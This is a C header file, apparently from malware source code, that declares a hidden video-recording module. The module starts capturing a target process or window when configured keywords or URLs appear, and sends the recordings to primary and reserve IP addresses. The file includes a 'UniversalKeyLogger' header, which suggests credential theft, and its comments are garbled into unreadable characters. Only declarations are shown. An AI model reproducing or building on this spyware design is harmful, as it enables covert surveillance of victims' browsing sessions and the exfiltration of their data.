#ifndef VideoRecorderH
#define VideoRecorderH
//-----------------------------------------------------------------------------

#include <windows.h>
#include "UniversalKeyLogger.h"


// ��������� ��������� ��� �������
#define VIDEOREC_PARAM_SIZE_HOST 50
#define VIDEOREC_PARAM_SIZE_URLS 3000

#define VIDEOREC_PARAM_NAME_HOST1 "VIDEO_REC_HOST1"
#define VIDEOREC_PARAM_NAME_HOST2 "VIDEO_REC_HOST2"
#define VIDEOREC_PARAM_NAME_URLS  "VIDEO_REC_URLS\0"

#define VIDEOREC_PARAM_ENCRYPTED_HOST false
#define VIDEOREC_PARAM_ENCRYPTED_URLS false



void StartRecordThread(DWORD pid, PCHAR KeyWord, PCHAR ip, PCHAR ReservedIP, int port);//�������� ����� ������ �����
void StartRecordThread1(HWND hWnd,PCHAR KeyWord,PCHAR ip, PCHAR ReservedIP, int port);//�������� ����� ������ �����
void StopRecordThread();//������������� ����� ������ �����
void StartSendThread(PCHAR Path,PCHAR ip, PCHAR ReservedIP, int port);//���������� ��� � �������� �� ��� �-���

//���� ���� ������ ���� ��������� ������� � �����, �������� ��� �������� ����������
void StartFindFields();
DWORD WINAPI StartSendinThread(LPVOID Data);

//������� ���������� ����� ������� ��� ������ �����
PCHAR GetVideoRecHost1();
PCHAR GetVideoRecHost2();

//void WINAPI IEURLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data);

void StartVideoFromCurrentURL();




//*********************************************************************
//  ������ ������� ������������� ������ �����
//  ���������� ������� - ������ ����� �������� �� �������
//  ������������������� ��������
//*********************************************************************
namespace VideoRecorderSrv
{
	//-----------------------------------------------------
	// Start - ������� ��������� ������ �������������
	//-----------------------------------------------------
	bool Start();

	//-----------------------------------------------------
	// StartRecording - ������� �������� ������ ������
	//					����� ��� �������� ��������
	//
	// URL - ����� ���� ��� �������� ���������������� ������.
	//-----------------------------------------------------
	bool StartRecording(PCHAR URL);

	//-----------------------------------------------------
	// StopRecording - ������� ������������� ������ ������
	//					����� ��� �������� ��������
	//-----------------------------------------------------
	bool StopRecording();

	//-----------------------------------------------------
	//  PingClient - ������� ��������� �������� ��
	//               ������ ������ � ��������� PID
	//	���� PID ����� 0 �� ����� ����������� �������
	//  �������
	//-----------------------------------------------------
	bool PingClient(DWORD PID);
}

//-----------------------------------------------------------------------------
#endif